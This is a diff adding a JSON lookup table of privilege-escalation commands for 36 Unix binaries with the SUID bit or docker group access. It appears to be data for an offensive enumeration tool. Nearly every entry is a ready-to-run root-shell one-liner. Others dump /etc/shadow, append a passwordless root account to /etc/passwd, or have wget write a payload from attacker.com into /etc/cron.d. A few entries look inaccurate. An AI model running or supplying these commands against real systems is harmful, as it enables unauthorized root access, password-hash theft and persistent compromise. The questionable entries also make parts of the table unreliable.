@@ -1,0 +1,146 @@
+{
+  "find": {
+    "exploit": "find . -exec /bin/sh -p \\; -quit",
+    "notes": "find with SUID can execute arbitrary commands as root via -exec flag"
+  },
+  "vim": {
+    "exploit": "vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'",
+    "notes": "vim can spawn a shell from its command mode using :! or Python integration"
+  },
+  "vi": {
+    "exploit": "vi -c ':!/bin/sh'",
+    "notes": "vi can spawn a shell from command mode with :!/bin/sh"
+  },
+  "awk": {
+    "exploit": "awk 'BEGIN {system(\"/bin/sh\")}'",
+    "notes": "awk can execute system commands via its BEGIN block"
+  },
+  "perl": {
+    "exploit": "perl -e 'exec \"/bin/sh\";'",
+    "notes": "perl can exec a shell directly; SUID perl gives root shell"
+  },
+  "python": {
+    "exploit": "python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
+    "notes": "Python os.execl can replace the process with a privileged shell"
+  },
+  "python2": {
+    "exploit": "python2 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
+    "notes": "Python2 os.execl can replace the process with a privileged shell"
+  },
+  "python3": {
+    "exploit": "python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
+    "notes": "Python3 os.execl can replace the process with a privileged shell"
+  },
+  "nmap": {
+    "exploit": "nmap --interactive (old versions) or echo 'os.execute(\"/bin/sh\")' > /tmp/shell.nse && nmap --script=/tmp/shell.nse",
+    "notes": "Old nmap versions have --interactive mode that drops to a shell; newer nmap supports NSE scripting"
+  },
+  "less": {
+    "exploit": "less /etc/passwd then type: !/bin/sh",
+    "notes": "less can execute shell commands via the ! operator"
+  },
+  "more": {
+    "exploit": "more /etc/passwd then type: !/bin/sh (if output is longer than screen)",
+    "notes": "more can execute shell commands via the ! operator when in pager mode"
+  },
+  "tar": {
+    "exploit": "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
+    "notes": "tar supports checkpoint actions that can execute arbitrary commands"
+  },
+  "cp": {
+    "exploit": "cp /bin/sh /tmp/sh && chmod u+s /tmp/sh OR overwrite /etc/passwd",
+    "notes": "SUID cp can overwrite critical files like /etc/passwd or /etc/sudoers"
+  },
+  "nano": {
+    "exploit": "nano then Ctrl+R Ctrl+X to execute commands",
+    "notes": "nano editor can read from command output via Ctrl+R Ctrl+X"
+  },
+  "bash": {
+    "exploit": "bash -p",
+    "notes": "bash -p runs with EUID preserved, giving a root shell when SUID bit is set"
+  },
+  "sh": {
+    "exploit": "sh -p",
+    "notes": "sh -p preserves the effective UID, yielding a privileged shell"
+  },
+  "dash": {
+    "exploit": "dash -p",
+    "notes": "dash -p preserves the effective UID, yielding a privileged shell"
+  },
+  "cat": {
+    "exploit": "cat /etc/shadow",
+    "notes": "SUID cat can read privileged files like /etc/shadow to extract password hashes"
+  },
+  "tee": {
+    "exploit": "echo 'root2::0:0:root:/root:/bin/bash' | tee -a /etc/passwd",
+    "notes": "SUID tee can write to any file including /etc/passwd"
+  },
+  "sed": {
+    "exploit": "sed -n '1e exec sh 1>&0' /etc/passwd",
+    "notes": "SUID sed can execute commands via the e flag"
+  },
+  "env": {
+    "exploit": "env /bin/sh -p",
+    "notes": "env with SUID preserves elevated privileges when spawning a shell"
+  },
+  "ruby": {
+    "exploit": "ruby -e 'exec \"/bin/sh\"'",
+    "notes": "ruby exec can replace the process with a privileged shell"
+  },
+  "lua": {
+    "exploit": "lua -e 'os.execute(\"/bin/sh\")'",
+    "notes": "lua os.execute can spawn a privileged shell"
+  },
+  "php": {
+    "exploit": "php -r 'pcntl_exec(\"/bin/sh\", [\"-p\"]);'",
+    "notes": "PHP pcntl_exec can spawn a privileged shell"
+  },
+  "gawk": {
+    "exploit": "gawk 'BEGIN {system(\"/bin/sh\")}'",
+    "notes": "gawk system() can execute arbitrary commands with elevated privileges"
+  },
+  "strace": {
+    "exploit": "strace -o /dev/null /bin/sh -p",
+    "notes": "SUID strace can be used to execute commands with elevated privileges"
+  },
+  "node": {
+    "exploit": "node -e 'require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"], {stdio: [0, 1, 2]})'",
+    "notes": "Node.js child_process can spawn a privileged shell"
+  },
+  "make": {
+    "exploit": "make -s --eval=$'x:\\n\\t-'\"/bin/sh -p\"",
+    "notes": "make can execute arbitrary commands through its build rules"
+  },
+  "zip": {
+    "exploit": "zip /tmp/exploit.zip /tmp/exploit -T --unzip-command=\"sh -c /bin/sh\"",
+    "notes": "zip -T flag can execute arbitrary commands for testing"
+  },
+  "socat": {
+    "exploit": "socat stdin exec:/bin/sh,pty,stderr,setsid,sigint,sane",
+    "notes": "socat with SUID can open an interactive root shell"
+  },
+  "screen": {
+    "exploit": "screen (then Ctrl+A then :exec sh -p)",
+    "notes": "screen multiplexer can execute shell commands in privileged context"
+  },
+  "tmux": {
+    "exploit": "tmux new-session -s exploit \"sh -p\"",
+    "notes": "tmux with SUID can create a new privileged shell session"
+  },
+  "docker": {
+    "exploit": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
+    "notes": "Access to docker group is equivalent to root — can mount host filesystem"
+  },
+  "git": {
+    "exploit": "GIT_SSH_COMMAND='sh -p' git clone /dev/null",
+    "notes": "git with SUID can execute commands via GIT_SSH_COMMAND or hooks"
+  },
+  "curl": {
+    "exploit": "curl file:///etc/shadow",
+    "notes": "SUID curl can read arbitrary files as root"
+  },
+  "wget": {
+    "exploit": "wget -O /etc/cron.d/exploit http://attacker.com/payload",
+    "notes": "SUID wget can overwrite system files"
+  }
+}
